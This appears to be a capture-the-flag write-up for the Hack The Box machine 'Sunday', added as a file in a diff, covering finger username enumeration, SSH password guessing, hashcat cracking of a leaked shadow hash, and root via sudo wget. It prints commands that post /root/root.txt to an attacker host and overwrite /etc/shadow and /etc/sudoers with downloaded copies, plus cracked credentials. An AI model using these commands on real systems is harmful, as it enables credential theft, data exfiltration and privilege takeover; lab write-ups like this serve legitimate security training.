@@ -1,0 +1,92 @@
+HTB-Sunday-Writeup
+
+ip : 10.10.10.76
+
+Nmap
+----
+- nmap scan revealed few open ports
+	- finger on 79
+	- rpcbind on 111
+	- ssh on 22022
+
+Enumeration
+-----------
+- we start by enumerating finger which is a legacy service that can be used to enumerate for usernames in the box 
+- finger identifies the currently logged in users and can also used to enumerate for a specific user
+- we dont get any results from either of these so now we can bruteforce for usernames 
+- we can download a script called finger-user-enum.pl and use it for bruteforcing
+
+	./finger-user-enum.pl -U /opt/SecLists/Usernames/Names/names.txt -t 10.10.10.76
+
+- we get a bunch of usernames out of which only 2 looks valid since they have sshed into the box  
+
+	sunny
+	sammy
+
+Shell as sunny
+--------------
+- since we have 2 valid usernames we can try to ssh into the box by guessing the password 
+- the primary guesses will be admin, password, password123, box name etc
+- we try sunny with sunday since its a thing and it worked
+- we have a shell
+- no user flag yet
+
+Shell as sammy
+--------------
+- inside the /backup we see a copy of the shadow file marked world readable which contains the hash for user sammy
+- we crack the hash with hashcat and we get the password for sammy 
+
+	hashcat -m 7400 sunday.hash rockyou.txt
+
+- we get the password as cooldude!
+
+	creds : sammy : cooldude!
+
+- we use the credentials to ssh into the box 
+- grab the user flag 
+
+Priv-esc
+--------
+- checking sudo -l we notice that sammy can run wget as root without password
+- there are plenty of ways we can use this to our advantage 
+- some of them are 
+
+--input-file
+----------- 
+- we can take advantage of the --input-file flag of wget to read the root.txt
+
+	sudo wget --input-file /root/root.txt
+
+Post flag
+---------
+- we can make wget post the file back to us using --post-file 
+
+	python3 -m http.server 443
+	sudo wget --post-file /root/root.txt http://10.10.11.64:443/
+	nc -nlvp 443
+
+Overwrite shadow
+----------------
+- get a copy of the shadow file on the attacking machine 
+- edit the shadow file to include a root user
+- get the shadow file on the sunday machine using wget
+
+	sudo wget -O /etc/shadow http://10.10.14.5/shadow
+
+- we can change into the root user using the command 
+
+	su -
+
+- we have a shell as root
+
+Overwrite sudoers
+-----------------
+- we can get the sudoers file on the attacking machine and change it to include a new application which can run sudo
+- get it to the sunday machine and use it to get root
+- here we change the sudoers file to include su to be used as root 
+
+	sudo wget -O /etc/sudoers http://10.10.14.5/sudoers
+
+- if we check sudo -l we can see that our user can run su as root without password 
+- we can use it to get root on the machine 
+- grab the root flag 
